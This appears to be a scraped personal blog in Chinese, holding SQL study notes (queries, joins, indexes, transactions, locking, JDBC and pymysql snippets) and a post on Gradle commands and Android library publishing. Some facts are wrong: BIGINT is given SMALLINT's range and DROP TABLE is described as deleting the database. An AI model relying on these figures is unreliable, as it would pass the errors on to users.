SET salary= 22000 WHERE salary &lt; 20000; ## 亲测这么干也行 ## 这样的条件语句还有很多，这个应该叫做Operator(操作符) 操作符主要分为四类 Arithmetic operators （数学加减乘除） Comparison operators（比较大小的） Logical operators （逻辑运算符） AND， ANY, BETWEEN,EXISTS,LIKE,OR ,IS NULL ,IS NOT NULL, UNIQUE Operators used to negate conditions 挑几个不容易理解的，下面这个叫做子查询 SELECT * FROM user WHERE EXISTS (SELECT * FROM todo WHERE user_id = 1) ; ## UNIQUE是用在创建表或者改表结构的: CREATE TABLE Persons ( Id_P int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (Id_P) ) // unique的意思很明显，不能允许出现同样的row 如果在SELECT的时候想要去重，用DISTINCT SELECT DISTINCT content FROM todo; SELECT COUNT(*) FROM todo; // 看下当前数据库有多少行了 SELECT COUNT(DISTINCT content) FROM todo; // 去重后看下有多少行 ### 模糊查询 SELECT * FROM [user] WHERE u_name LIKE &#39;%三%&#39;; //将会把u_name为“张三”，“张猫三”、“三脚猫”，“唐三藏”等等有“三”的记录全找出来。 SELECT * FROM [user] WHERE u_name LIKE &#39;_三_&#39;; //只找出“唐三藏”这样u_name为三个字且中间一个字是“三”的；_ ： 表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字 符长度语句： SELECT * FROM [user] WHERE u_name LIKE &#39;[张李王]三&#39; ; 将找出“张三”、“李三”、“王三”（而不是“张李王三”）； SELECT * FROM [user] WHERE u_name LIKE &#39;[^张李王]三&#39;; 将找出不姓“张”、“李”、“王”的“赵三”、“孙三”等； ## orderBy SELECT * FROM CUSTOMERS ORDER BY NAME DESC; //就是把查出来的结果排序，按照名称的ASIC顺序倒序排列 ## groupBy GROUP BY的顺序在orderBy前面(groupby要写在orderby前面)，意思就是把相同结果的整合成一行 基本的语法是 SELECT column_one FROM table_name WHERE column_two = &quot;&quot; AND ... GROUP BY column_one ORDER BY column_two; SELECT NAME, SUM(SALARY) FROM CUSTOMERS GROUP BY NAME; // 这里还用了sum函数，计算CUSTOMER表中各个用户的salary总和，name相同的算作一个合并起来。 ## we want to add a column to table ALTER TABLE potluck ADD email VARCHAR(40); ## this way we add to a specific position ALTER TABLE potluck ADD email VARCHAR(40) AFTER name; ## drop this column ALTER TABLE potluck DROP email; ## how about delete this row DELETE from potluck where name=&#39;Sandy&#39;; ## 从删库到跑路 TRUNCATE TABLE table_name; //将这张表的内容全部抹掉 ## error: Cannot truncate a table referenced in a foreign key constraint(有时候会碰到这种错误，这也是约束的一种体现) DROP TABLE table_name; //删除这个数据库 一些实用的例子： 单列数据分组统计SELECT id,name,SUM(price) AS title,date FROM tb_price GROUP BY pid ORDER BY title DESC; 多列数据分组统计SELECT id,name,SUM(price*num) AS sumprice FROM tb_price GROUP BY pid ORDER BY sumprice DESC; 多表分组统计SELECT a.name,AVG(a.price),b.name,AVG(b.price) FROM tb_demo058 AS a,tb_demo058_1 AS b WHERE a.id=b.id GROUP BY b.type; 跨表查询现实生活中经常要从多个数据表中读取数据，关键字JOIN根据ForeignKey去查询： ## 主表 create table department( id int primary key auto_increment, name varchar(20) not null, description varchar(100) ); ## 从表，外键是在从表中创建，从而找到与主表之间的联系 create table employee( id int primary key auto_increment, name varchar(10) not null, gender varchar(2) not null, salary float(10,2), age int(2), gmr int, dept_id int ); ## 外键可以在建表的时候加，也可以在建表完成之后加 ALTER TABLE employee ADD FOREIGN KEY(dept_id) REFERENCES department(id); [ON DELETE {RESTRICT | CASCADE | SET NULL | NO ACTION}] [ON UPDATE {RESTRICT | CASCADE | SET NULL | NO ACTION} ## 写django的时候就会注意到CASCADE（级联）这个单词，如果主表的记录删掉，则从表中相关联的记录都将被删掉。 RESTRICT(限制)：如果你想删除的那个主表，它的下面有对应从表的记录，此主表将无法删除。（这个好像是默认规则） SET NULL：将外键设置为空。 NO ACTION：什么都不做。 以上，每个员工有一个dep_id的Foreign_key，对应department表中的id.删除外键 alter table emp drop foreign key 外键名; 开始联表查询，区分inner join ,left join, right join ##下面这俩一样的 ##inner join，只列出匹配的记录 select e.name,d.name from employee e inner join department d on e.dept_id=d.id; ##inner可以不写，默认是inner select e.name,d.name from employee e,department d where e.dept_id=d.id; ## left join 左连接即以左表为基准，显示坐标所有的行，右表与左表关联的数据会显示，不关联的则不显示。 select table a left join table b on a.id = b.ta_id; ## right join 右表列出全部，左表只列出匹配的记录。 ## 自连接(据说非常重要)，下面这句查询出员工姓名及其leader的姓名，是的，sql语句里面赋值都是行的。这种带点号的还真像object oriented promramming select e1.name 员工, e2.name 领导 from employee e1 left join employee e2 on e1.leader=e2.id; ## 等于说根据表名虚拟出两张表 ## 查询所有leader的姓名 select e2.name 领导 from employee e1 left join employee e2 on e1.leader=e2.id; 以上还只是两张表连在一起查，现实中还有n张表连在一起查，下面这个是三张表一起查 select table a left join table b(left join table c on b.id = c.tb_id) on a.id = b_ta.id 再加的话就是多张表在一起查，其实就是一层层的sql嵌套，写的时候从外层往里面写，一层层left join。 这个子查询是查找月薪最高的员工的名字SELECT name,salary from employee where salary=(select max(salary) from employee); 查询每个部门的平均月薪select avg(salary),dept_id from employee where dept_id is not null group by depy_id; AUTO_INCREMENT在sqlite3中是这么干的下面的python sqlalchemy语句是亲测通过的 from sqlalchemy import create_engine db_uri = &quot;sqlite:///db.sqlite&quot; engine = create_engine(db_uri) # DBAPI - PEP249 # create table engine.execute(&#39;CREATE TABLE IF NOT EXISTS &quot;EX1&quot; (&#39; &#39;id INTEGER PRIMARY KEY AUTOINCREMENT,&#39; &#39;name VARCHAR);&#39;) # insert a raw engine.execute(&#39;INSERT INTO &quot;EX1&quot; &#39; &#39;( name) &#39; &#39;VALUES (&quot;raw1&quot;)&#39;) # select * result = engine.execute(&#39;SELECT * FROM &#39; &#39;&quot;EX1&quot;&#39;) for _r in result: print(_r) # delete * # engine.execute(&#39;DELETE from &quot;EX1&quot; where id=1;&#39;) result = engine.execute(&#39;SELECT * FROM &quot;EX1&quot;&#39;) print(result.fetchall()) auto increment只要在insert的时候直接忽略掉自增的字段就好了，否则会报unique constraint failed 支持的数据类型signed or unsigned.(有符号或者无符号的) NumericINT (signed : -2147483648 to 2147483647 or unsigned: 0 to 4294967295.)，2的32次方(4 byte)TINYINT(signed : -128 to 127, or unsigned: from 0 to 255)，2的八次方(1 byte)BIGINT( signed :-32768 to 32767, or unsigned: from 0 to 65535.)，2的四次方(2 byte)FLOAT(只能是signed)，DOUBLE，DECIMAL Date and TimeDATE (1973-12-30), DATETIME (1973-12-30 15:30:00),TIMESTAMP (19731230153000),TIME (HH:MM:SS), String Types.CHAR(fixed-length，长度固定，不强制要求设置长度，默认1) ,VARCHAR(ariable-length string between 1 and 255，长度可变， ),BLOB or TEXT(BLOBs case sensitive，TEXT not case sensitive,这俩不需要设定长度，最大长度65535 )ENUM (置顶的枚举类型中之一，可以为NULL)BOOLEAN类型是不存在的用TINYINT就好了，0表示false，1表示true; 约束constraint的一个例子，A表的一个column引用了B表的一个id键作为foreign key.这时候如果想往A表里添加数据，假如尝试添加的这个外键在B表中不存在，会无法执行。 INSERT INTO todo (todo_id,user_id,content,completed,date_added,date_modified) VALUES (102,11,&quot;random stufffssss&quot;,0,&quot;2012-02-09&quot;,&quot;2016-03-27&quot;); Joins clause 从多个表中进行查询，对共有的属性进行操作SELECT ID, NAME, AGE, AMOUNT FROM CUSTOMERS, ORDERS WHERE CUSTOMERS.ID = ORDERS.CUSTOMER_ID; inner join(查的是customer表，但查出来的结果里有来自ORDERS的column) SQL&gt; SELECT ID, NAME, AMOUNT, DATE FROM CUSTOMERS INNER JOIN ORDERS ON CUSTOMERS.ID = ORDERS.CUSTOMER_ID; 时间戳这一部分应该属于sql的函数了 SELECT CURDATE(); // YYYY-MM-DD格式 2018-02-10 select now(); // 2018-02-10 15:49:10 想要时间戳的话可以这么干 SELECT unix_timestamp(); // 1518249025 select unix_timestamp(&#39;2008-08-08&#39;); // 1218124800 select unix_timestamp(CURDATE()); //1518192000 // insert一行的时候自动设置插入的时间戳，当然简单了. Create Table Student ( Name varchar(50), DateOfAddmission datetime default CURRENT_TIMESTAMP ); /*下面这个也是行的，CURRENT_TIMESTAMP是一个关键字*/ CREATE TABLE foo ( creation_time DATETIME DEFAULT CURRENT_TIMESTAMP, modification_time DATETIME ON UPDATE CURRENT_TIMESTAMP ) modification_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP 建索引(Advanced sql)常常听后台的人说，这个sql查询太慢了，要建索引哈。但是索引对于提高查询性能也不是万能的，也不是建立越多的索引就越好。索引建少了，用 WHERE 子句找数据效率低，不利于查找数据。索引建多了，不利于新增、修改和删除等操作，因为做这些操作时，SQL SERVER 除了要更新数据表本身，还要连带立即更新所有的相关索引，而且过多的索引也会浪费硬盘空间。 查了下 CREATE INDEX PersonIndex ON Person (LastName) ; //名为 &quot;PersonIndex&quot;，在 Person 表的 LastName 列： sql建索引主要是为了查找的时候能够跟翻字典一样快。一般来说，主键，外键应该建索引，频繁更新的列就不要更新索引了 CREATE INDEX salary_index ON COMPANY(salary); // 创建索引 SELECT * FROM COMPANY INDEXED BY salary_index WHERE salary &gt; 5000; //创建好了之后就要根据index来查了 适合建索引的列是出现在WHERE子句中的列，或者join子句(on语句)中指定的列，就是说那些被当做条件的东西应该作为索引。 索引不要搞得太多，建立索引和维护索引都比较耗时。update,delete,insert都要维护索引 Transaction 事务 Atomicity − ensures that all operations within the work unit are completed successfully. Otherwise, the transaction is aborted at the point of failure and all the previous operations are rolled back to their former state. Consistency − ensures that the database properly changes states upon a successfully committed transaction. Isolation − enables transactions to operate independently of and transparent to each other. Durability − ensures that the result or effect of a committed transaction persists in case of a system failure. 论ACID是什么事务的写法 BEGIN; DELETE FROM CUSTOMERS WHERE AGE = 25; ROLLBACK; //回滚 COMMIT; //提交更改 SAVEPOINT SAVEPOINT_NAME; ROLLBACK TO SAVEPOINT_NAME; language supportjavajava的版本accessing-data-mysql package com.vae.jdbc; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class JDBCtest { //数据库连接地址 public final static String URL = &quot;jdbc:mysql://localhost:3306/JDBCdb&quot;; //用户名 public final static String USERNAME = &quot;root&quot;; //密码 public final static String PASSWORD = &quot;smyh&quot;; //驱动类 public final static String DRIVER = &quot;com.mysql.jdbc.Driver&quot;; public static void main(String[] args) { // TODO Auto-generated method stub //insert(p); //update(p); //delete(3); insertAndQuery(); } //方法：使用PreparedStatement插入数据、更新数据 public static void insertAndQuery(){ Connection conn = null; try { Class.forName(DRIVER); conn = DriverManager.getConnection(URL, USERNAME, PASSWORD); String sql1 = &quot;insert into user(name,pwd)values(?,?)&quot;; String sql2 = &quot;update user set pwd=? where name=?&quot;; PreparedStatement ps = conn.prepareStatement(sql1); // 这行其实比较费性能 ps.setString(1, &quot;smyhvae&quot;); ps.setString(2, &quot;007&quot;); ps.executeUpdate(); ps = conn.prepareStatement(sql2); ps.setString(1, &quot;008&quot;); ps.setString(2, &quot;smyh&quot;); ps.executeUpdate(); ps.close(); conn.close(); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (SQLException e) { e.printStackTrace(); } } } Spring里面用的是jpa python的版本python-mysql python3不再支持mysqldb 请用pymysql和mysql.connector import pymysql conn = pymysql.connect(host=’127.0.0.1’, port=3306, user=’root’, passwd=’test’, db=’mysql’) cur = conn.cursor() cur.execute(“SELECT * FROM user”) for r in cur.fetchall(): print(r) #cur.close() conn.close() 实际开发中都用的orm框架,sqlAlchemy nodejsusing mysql in node js 更新SQLite支持事务，这就以外这需要在并发环境下，保持事务的ACID特性。Sqlite的锁实现基于文件锁，对于Linux系统，文件锁主要包含协同锁和强制锁。 sqlite不支持删除column,确定无疑SQLite supports a limited subset of ALTER TABLE. The ALTER TABLE command in SQLite allows the user to rename a table or to add a new column to an existing table. It is not possible to rename a column, remove a column, or add or remove constraints from a table.It is not possible to rename a column, remove a column, or add or remove constraints from a table。//更改约束也不行 alter table record drop column name; //报错 //一种周转的方法create table temp as select recordId, customer, place, time from record where 1 = 2; //复制record的表结构，不包含内容drop table record;alter table temp rename to record; // Sqlite的优化手段 beginTransaction DB.compileStatement(“DELETE FROM users WHERE first_name = ?”)//节省了每次parse sql语句的开销 sqlite一次插入多条记录的优化方法，使用union 观察到一个现象，在编辑数据库，数据库打开的情况下，test.db所在的文件夹下面同时生成了一个test.db.journal文件，一旦关闭数据库连接，这个文件就没了。 你的数据库用什么存储引擎？区别是？答案：常见的有MyISAM和InnoDB。MyISAM：不支持外键约束。不支持事务。对数据大批量导入时，它会边插入数据边建索引，所以为了提高执行效率，应该先禁用索引，在完全导入后再开启索引。InnoDB：支持外键约束，支持事务。对索引都是单独处理的，无需引用索引。 联表一对多查询联表多对多查询 Another choicemariadb MariaDb是在oracle收购mysql之后，社区fork的一个mysql版本，除了packagename不一样以外，操作都差不多。PostgreSQL 建表语句: DROP TABLE IF EXISTS `user`; CREATE TABLE `user` ( `user_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `user_name` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, `user_password` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, `user_nickname` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT &#39;&#39;, `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, PRIMARY KEY (`user_id`), KEY `user_name` (`user_name`), CREATE TABLE `news` (`news_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,`news_author` int(6) NOT NULL DEFAULT &#39;0&#39;,`news_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,`news_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,`news_title` text COLLATE utf8mb4_unicode_ci NOT NULL,`news_excerpt` text COLLATE utf8mb4_unicode_ci NOT NULL,`news_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;publish&#39;,`news_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,`news_category` int(4) NOT NULL,PRIMARY KEY (`news_id`), KEY `type_status_date` (`news_status`,`news_date`,`news_id`),KEY `post_author` (`news_author`)) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; mysql&gt; describe user;+—————+———————+——+—–+———+—————-+| Field | Type | Null | Key | Default | Extra |+—————+———————+——+—–+———+—————-+| user_id | bigint(20) unsigned | NO | PRI | NULL | auto_increment || user_name | varchar(60) | NO | MUL | | || user_password | varchar(30) | NO | | | || user_nickname | varchar(50) | YES | | | || user_email | varchar(100) | NO | MUL | | |+—————+———————+——+—–+———+—————-+5 rows in set (0.00 sec) mysql&gt; describe news;+—————+———————+——+—–+——————-+—————-+| Field | Type | Null | Key | Default | Extra |+—————+———————+——+—–+——————-+—————-+| news_id | bigint(20) unsigned | NO | PRI | NULL | auto_increment || news_author | int(6) | NO | MUL | 0 | || news_date | datetime | NO | | CURRENT_TIMESTAMP | || news_content | longtext | NO | | NULL | || news_title | text | NO | | NULL | || news_excerpt | text | NO | | NULL | || news_status | varchar(20) | NO | MUL | publish | || news_modified | datetime | NO | | CURRENT_TIMESTAMP | || news_category | int(4) | NO | | NULL | |+—————+———————+——+—–+——————-+—————-+9 rows in set (0.00 sec) spring官方给的手把手教程很详细乐观锁(需要自己实现或者使用orm框架)和悲观锁(数据库自带).悲观锁包括共享锁和排他锁:共享锁: 在执行sql语句屁股后面加上lock in share mode排他锁：在执行sql语句屁股后面加上for update 举个例子： begin; ##开启一个实务，不commit SELECT * from city where id = &quot;1&quot; lock in share mode; update city set name=&quot;666&quot; where id =&quot;1&quot;; ##会error的 另外还有行锁，表锁行锁： SELECT * from city where id = “1” lock in share mode;AUTO_INCREMENT有时候不会从1开始 mysql查看连接数生产环境Mysql吃内存特别厉害的解决途径todo 建表，实查 mysql存储中文数据有什么要注意的嘛 primary key是两个key的组合也是可以的mysql&gt; CREATE TABLE score( student_id INT UNSIGNED NOT NULL, event_id INT UNSIGNED NOT NULL, score INT NOT NULL, PRIMARY KEY(event_id, student_id)); pragmatic copy paste cheet sheet SELECT last_name,first_name,state FROM students WHERE first_name LIKE ‘D%’ OR last_name LIKE ‘%n’ GROUP BY state;ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column ‘Banana.students.last_name’ which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by改成 SELECT last_name,first_name,state FROM students WHERE first_name LIKE ‘D%’ OR last_name LIKE ‘%n’ GROUP BY last_name,first_name,state; 启用mysql缓存降低cpu的使用率 经常会看到一个.sql文件，比方说这个，怎么导出来的？ qps和tps这种术语QPS： Queries Per Second意思是“每秒查询率”，是一台服务器每秒能够相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。 TPS： 是TransactionsPerSecond的缩写，也就是事务数/秒。它是软件测试结果的测量单位。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数。","tags":[{"name":"sql","slug":"sql","permalink":"https://haldir65.github.io/tags/sql/"}]},{"title":"gradle command记事本","date":"2018-02-03T14:46:09.000Z","path":"2018/02/03/2018-02-03-gradle-command-explained/","text":"Gradle插件开发，官方推荐的具备first class supprot 的IDE包括Android Studio和Intelij Idea等。Gradle的编译流程分为三步build_lifecycleInitialization -&gt; Configuration -&gt; Execution执行的单位叫做TaskGradle作为一个program，可以为编译环境设置的参数很多 Android dependency ‘com.android.support:support-v4’ has different version for the compile (21.0.3) and runtime (26.1.0) classpath. You should manually set the same version via DependencyResolution 一些常用的gradle的command 如下 gradlew :app:dependencies –configuration releaseCompileClasspath//前面这个:app只是代表app这个project的gradle tasks –all ## 查看当前project的所有tasksgradle taskA taskB ##多个task是可以同时执行的gradle –status ## 查看当前操作系统中还有那些Daemon可以用 afterEvaluate是属于project的属性(也可以在allProject中加) I forced the version of support-v4 using this block in root build.gradle: subprojects { project.configurations.all { resolutionStrategy.eachDependency { details -&gt; if (details.requested.group == &#39;com.android.support&#39; &amp;&amp; !details.requested.name.contains(&#39;multidex&#39;) ) { details.useVersion &quot;$supportlib_version&quot; } } } } All com.android.support libraries must use the exact same version [duplicate] 关于gradlew只是一层gradle的wrapper，找到这么一段话:The Gradle Wrapper is the preferred way of starting a Gradle build. It consists of a batch script for Windows and a shell script for OS X and Linux. These scripts allow you to run a Gradle build without requiring that Gradle be installed on your system. This used to be something added to your build file, but it’s been folded into Gradle, so there is no longer any need. Instead, you simply use the following command. $ gradle wrapper –gradle-version 2.13 ./gradlew -v 版本号./gradlew clean 清除app目录下的build文件夹./gradlew build 检查依赖并编译打包./gradlew assembleDebug 编译并打Debug包./gradlew assembleRelease 编译并打Release的包或者./gradlew aR./gradlew installRelease Release模式打包并安装或者./gradlew iR./gradlew uninstallRelease 卸载Release模式包 Android项目迁移到gradle 3.0需要注意的一些事 implementation和api的区别： When your module configures an implementation dependency, it’s letting Gradle know that the module does not want to leak the dependency to other modules at compile time. That is, the dependency is available to other modules only at runtime.Using this dependency configuration instead of api or compile can result in significant build time improvements because it reduces the amount of projects that the build system needs to recompile. For example, if an implementation dependency changes its API, Gradle recompiles only that dependency and the modules that directly depend on it. Most app and test modules should use this configuration.// a module 使用implementation引入了某个dependency，这个依赖就不会暴露给依赖于a的mudule。 When a module includes an api dependency, it’s letting Gradle know that the module wants to transitively export that dependency to other modules, so that it’s available to them at both runtime and compile time. This configuration behaves just like compile (which is now deprecated), and you should typically use this only in library modules. That’s because, if an api dependency changes its external API, Gradle recompiles all modules that have access to that dependency at compile time. So, having a large number of api dependencies can significantly increase build times. Unless you want to expose a dependency’s API to a separate test module, app modules should instead use implementation dependencies.//所以如果想要把自己的某项依赖暴露出去，让依赖自己的mudule也能用到这项依赖，就要用api了但是api和之前的compile是一样的，所以编译速度比implementation慢很多。 看到一份关于android build tasks解释的非常好的文章 mergeDebugResources任务的作用是解压所有的aar包输出到app/build/intermediates/exploded-aar，并且把所有的资源文件合并到app/build/intermediates/res/merged/debug目录里 processDebugManifest任务是把所有aar包里的AndroidManifest.xml中的节点，合并到项目的AndroidManifest.xml中，并根据app/build.gradle中当前buildType的manifestPlaceholders配置内容替换manifest文件中的占位符，最后输出到app/build/intermediates/manifests/full/debug/AndroidManifest.xml processDebugResources的作用 1、调用aapt生成项目和所有aar依赖的R.java,输出到app/build/generated/source/r/debug目录 3、生成资源索引文件app/build/intermediates/res/resources-debug.ap_ 2、把符号表输出到app/build/intermediates/symbols/debug/R.txt compileDebugJavaWithJavac这个任务是用来把java文件编译成class文件，输出的路径是app/build/intermediates/classes/debug 编译的输入目录有 - 1、项目源码目录，默认路径是app/src/main/java，可以通过sourceSets的dsl配置，允许有多个（打印project.android.sourceSets.main.java.srcDirs可以查看当前所有的源码路径,具体配置可以参考android-doc - 2、app/build/generated/source/aidl - 3、app/build/generated/source/buildConfig - 4、app/build/generated/source/apt(继承javax.annotation.processing.AbstractProcessor做动态代码生成的一些库，输出在这个目录，具体可以参考Butterknife 和 Tinker)的代码 transformClassesWithJarMergingForDebug的作用是把compileDebugJavaWithJavac任务的输出app/build/intermediates/classes/debug，和app/build/intermediates/exploded-aar中所有的classes.jar和libs里的jar包作为输入，合并起来输出到app/build/intermediates/transforms/jarMerging/debug/jars/1/1f/combined.jar，我们在开发中依赖第三方库的时候有时候报duplicate entry:xxx 的错误，就是因为在合并的过程中在不同jar包里发现了相同路径的类 transformClassesWithMultidexlistForDebug这个任务花费的时间也很长将近8秒，它有两个作用 - 1、扫描项目的AndroidManifest.xml文件和分析类之间的依赖关系，计算出那些类必须放在第一个dex里面,最后把分析的结果写到app/build/intermediates/multi-dex/debug/maindexlist.txt文件里面 - 2、生成混淆配置项输出到app/build/intermediates/multi-dex/debug/manifest_keep.txt文件里 项目里的代码入口是manifest中application节点的属性android.name配置的继承自Application的类，在android5.0以前的版本系统只会加载一个dex(classes.dex)，classes2.dex .......classesN.dex 一般是使用android.support.multidex.MultiDex加载的，所以如果入口的Application类不在classes.dex里5.0以下肯定会挂掉，另外当入口Application依赖的类不在classes.dex时初始化的时候也会因为类找不到而挂掉，还有如果混淆的时候类名变掉了也会因为对应不了而挂掉,综上所述就是这个任务的作用 transformClassesWithDexForDebug这个任务的作用是把包含所有class文件的jar包转换为dex，class文件越多转换的越慢 输入的jar包路径是app/build/intermediates/transforms/jarMerging/debug/jars/1/1f/combined.jar 输出dex的目录是build/intermediates/transforms/dex/debug/folders/1000/1f/main app/build/intermediates/symbols/debug/R.txt这个文件长这样 int anim abc_fade_in 0x7f010000int anim abc_fade_out 0x7f010001int anim abc_grow_fade_in_from_bottom 0x7f010002int anim abc_popup_enter 0x7f010003int anim abc_popup_exit 0x7f010004int anim abc_shrink_fade_out_from_bottom 0x7f010005int anim abc_slide_in_bottom 0x7f010006int anim abc_slide_in_top 0x7f010007int anim abc_slide_out_bottom 0x7f010008int anim abc_slide_out_top 0x7f010009int anim design_bottom_sheet_slide_in 0x7f01000aint anim design_bottom_sheet_slide_out 0x7f01000bint anim design_snackbar_in 0x7f01000cint anim design_snackbar_out 0x7f01000dint anim tooltip_enter 0x7f01000eint anim tooltip_exit 0x7f01000fint animator design_appbar_state_list_animator 0x7f020000int attr actionBarDivider 0x7f030000int attr actionBarItemBackground 0x7f030001int attr actionBarPopupTheme 0x7f030002int attr actionBarSize 0x7f030003…按照字母从a-z开始，hex value自增(0x7f开头) Android Studio中点击run之后，执行了这些tasks Task spend time: 2ms :app:preBuild 64ms :app:preDebugBuild 9ms :app:compileDebugAidl 4ms :app:compileDebugRenderscript 1ms :app:checkDebugManifest 2ms :app:generateDebugBuildConfig 1ms :app:prepareLintJar 1ms :app:generateDebugResValues 0ms :app:generateDebugResources 57ms :app:mergeDebugResources 1ms :app:createDebugCompatibleScreenManifests 4ms :app:processDebugManifest 1ms :app:splitsDiscoveryTaskDebug 18ms :app:processDebugResources 1ms :app:generateDebugSources 11ms :app:javaPreCompileDebug 10ms :app:compileDebugJavaWithJavac 1ms :app:compileDebugNdk 0ms :app:compileDebugSources 4ms :app:mergeDebugShaders 1ms :app:compileDebugShaders 0ms :app:generateDebugAssets 8ms :app:mergeDebugAssets 19ms :app:transformClassesWithDexBuilderForDebug 6ms :app:transformDexArchiveWithExternalLibsDexMergerForDebug 7ms :app:transformDexArchiveWithDexMergerForDebug 1ms :app:mergeDebugJniLibFolders 12ms :app:transformNativeLibsWithMergeJniLibsForDebug 10ms :app:transformNativeLibsWithStripDebugSymbolForDebug 0ms :app:processDebugJavaRes 24ms :app:transformResourcesWithMergeJavaResForDebug 2ms :app:validateSigningDebug 7ms :app:packageDebug 0ms :app:assembleDebug 可以分成这5类吧 Preparation of dependencies. During this phase Gradle check that all libraries this module depends on are ready. If this module depends on another one, that module would be built as well. Merging resources and processing Manifest. After this phase resources and Manifest are ready to be packaged in the result file. Compiling. This phase started with Annotation Processors, in case you use them. Then source code is compiled into byte code. If you are using AspectJ, weaving also happens here. Postprocessing. All Gradle tasks with a “transform” prefix are part of this phase. Most important ones are: transformClassesWithMultidexlist and transformClassesWithDex. They produce .DEX files. Packaging and publishing. For libraries this stage means creating an .AAR file in the end, for applications — .APK. 简书上有人总结了 Gradle的Flavor能否配置sourceset?在sourceSets中可以设置不同flavor各自的java.srcDirs和res.srcDirs Product flavors一个product flavor定义了从项目中构建了一个应用的自定义版本。一个单一的项目可以同时定义多个不同的flavor来改变应用的输出。Build Type + Product Flavor = Build Variant（构建类型+定制产品=构建变种版本）这句话的意思就是，BuildTypes有n种，product flavor有m种，最终可能的组合有m*n种Gradle Plugin User Guide 美团外卖Android平台化架构演进实践 gradle 4.4之后Clock 被Deprecated的方案是自己创建一个groovy文件 org.gradle.util.Clock() // 被Deprecated之后的解决方案 building-android-apps 2. 创建java Library并提交到jcenter的方法JFrog 是软件管理和分发的领先通用解决方案JFrog 是软件管理和分发的领先通用解决方案，JFrog Bintray（通用分发平台）只是他家的众多服务之一。这个通用分发平台，就当CDN用好了。bintray的注册地址。注册好了之后登录bintray，创建一个仓库，随便起名字，比如叫maven。在build.gradle中就可以引入 maven { url ‘https://dl.bintray.com/yourusername/maven‘ }compile ‘com.yourusername:librayName:1.0.0’ 到这里，就可以自己直接使用了。要想提交到jcenter(就是说不用添加一个maven {url }这样的源)，jcenter(托管在Bintray网站上的官方库，官方和普通的区别就是提交上去要审核)和mavenCentral也是仓库。只不过是有官方维护的了。因为maven的标准写法是 maven { url “https://someurl“ } // maven { url “https://jitpack.io“ } // 比如说jitpack仓库 正儿八经的上传到jcenter的方式：一.在最外层build.gradle中添加 classpath ‘com.github.dcendents:android-maven-gradle-plugin:1.3’ // classpath ‘com.jfrog.bintray.gradle:gradle-bintray-plugin:1.6’ 配好了大概长这样 // Top-level build file where you can add configuration options common to all sub-projects/modules. buildscript { repositories { jcenter() google() } dependencies { classpath &#39;com.android.tools.build:gradle:3.0.1&#39; classpath &#39;com.github.dcendents:android-maven-gradle-plugin:1.4.1&#39; classpath &#39;com.jfrog.bintray.gradle:gradle-bintray-plugin:1.6&#39; // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files } } allprojects { repositories { jcenter() google() } } android-maven-gradle-plugin插件是用来打包Maven所需文件的。gradle-bintray-plugin插件是用来将生成的Maven所需文件上传到Bintray的。 二.在library module的build.gradle中添加 apply plugin: &#39;com.github.dcendents.android-maven&#39; apply plugin: &#39;com.jfrog.bintray&#39; // This is the library version used when deploying the artifact version = &quot;1.0.0&quot; def siteUrl = &#39;https://github.com/Haldir65/androidMedia&#39; // 项目的主页 def gitUrl = &#39;https://github.com/Haldir65/androidMedia.git&#39; // Git仓库的url group = &quot;com.github.haldir65.starry&quot; // Maven Group ID for the artifact，一般填你唯一的包名 install { repositories.mavenInstaller { // This generates POM.xml with proper parameters pom { project { packaging &#39;aar&#39; // Add your description here name &#39;Starry\\n&#39; + &#39;Starry night\\n&#39; + &#39;Paint your palette blue and grey&#39; url siteUrl // Set your license licenses { license { name &#39;The Apache Software License, Version 2.0&#39; url &#39;http://www.apache.org/licenses/LICENSE-2.0.txt&#39; } } developers { developer { id &#39;haldir&#39; //填写的一些基本信息 name &#39;johnDoe&#39; email &#39;mjw090608@gmail.com&#39; } } scm { connection gitUrl developerConnection gitUrl url siteUrl } } } } } task sourcesJar(type: Jar) { from android.sourceSets.main.java.srcDirs classifier = &#39;sources&#39; } task javadoc(type: Javadoc) { source = android.sourceSets.main.java.srcDirs classpath += project.files(android.getBootClasspath().join(File.pathSeparator)) } task javadocJar(type: Jar, dependsOn: javadoc) { classifier = &#39;javadoc&#39; from javadoc.destinationDir } artifacts { archives javadocJar archives sourcesJar } Properties properties = new Properties() properties.load(project.rootProject.file(&#39;local.properties&#39;).newDataInputStream()) bintray { user = properties.getProperty(&quot;bintray.user&quot;) key = properties.getProperty(&quot;bintray.apikey&quot;) configurations = [&#39;archives&#39;] pkg { repo = &quot;maven&quot; name = &quot;Starry&quot; //发布到JCenter上的项目名字 websiteUrl = siteUrl vcsUrl = gitUrl licenses = [&quot;Apache-2.0&quot;] publish = true } } javadoc { //jav doc采用utf-8编码否则会报“GBK的不可映射字符”错误 options{ encoding &quot;UTF-8&quot; charSet &#39;UTF-8&#39; } } 三.在local.properities中添加 bintray.user=your bintray usernamebintray.apikey=your apikey 记得把local.properties加到gitignore里面，搞定 在需要使用的module的build.gradle中引入 buildscript { repositories { maven { url &#39;https://dl.bintray.com/haldir65/maven&#39; } } } dependencies { implementation 